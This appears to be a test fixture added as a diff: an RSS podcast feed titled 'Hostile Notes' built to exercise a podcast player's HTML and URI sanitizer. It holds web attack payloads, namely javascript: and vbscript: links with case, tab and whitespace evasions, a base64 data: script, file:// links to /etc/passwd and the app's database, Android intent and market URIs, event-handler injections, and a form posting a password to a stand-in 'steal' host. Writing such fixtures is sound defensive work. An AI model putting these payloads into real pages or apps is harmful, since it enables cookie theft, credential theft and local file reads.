@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+  <channel>
+    <title>Hostile Notes</title>
+    <link>javascript:alert(1)</link>
+    <itunes:image href="javascript:alert('image')"/>
+    <item>
+      <title>Click me</title>
+      <guid>js-1</guid>
+      <link>intent://scan/#Intent;scheme=zxing;package=com.example.evil;end</link>
+      <enclosure url="https://media.example.com/js1.mp3" type="audio/mpeg" length="1"/>
+      <itunes:image href="file:///data/data/us.dikarya.podplayer/databases/podplayer.db"/>
+      <content:encoded><![CDATA[
+        <p>Safe <a href="https://example.org/show">link</a> and <a href="mailto:host@example.org">mail</a>.</p>
+        <p><a href="javascript:alert(document.cookie)">js</a>
+           <a href="JaVaScRiPt:alert(1)">mixed case</a>
+           <a href="java&#x09;script:alert(1)">tab inside</a>
+           <a href=" javascript:alert(1)">leading space</a>
+           <a href="intent://scan/#Intent;scheme=zxing;package=com.example.evil;end">intent</a>
+           <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data</a>
+           <a href="vbscript:msgbox(1)">vbs</a>
+           <a href="file:///etc/passwd">file</a>
+           <a href="content://com.example.provider/secret">content</a>
+           <a href="market://details?id=com.example.evil">market</a>
+           <a href="/relative/path">relative</a></p>
+        <script>alert('script')</script>
+        <iframe src="https://evil.example.test/frame">iframe text</iframe>
+        <form action="https://evil.example.test/steal"><input name="password" value="hunter2"><button>Send</button></form>
+        <style>body { display: none }</style>
+        <img src="https://tracker.example.test/pixel.gif" onerror="alert(1)">
+        <p onclick="alert(1)" style="color:red">Paragraph with handlers</p>
+        <svg onload="alert(1)"><text>svg text</text></svg>
+        <object data="https://evil.example.test/x.swf">object text</object>
+        <embed src="https://evil.example.test/x.swf">
+      ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
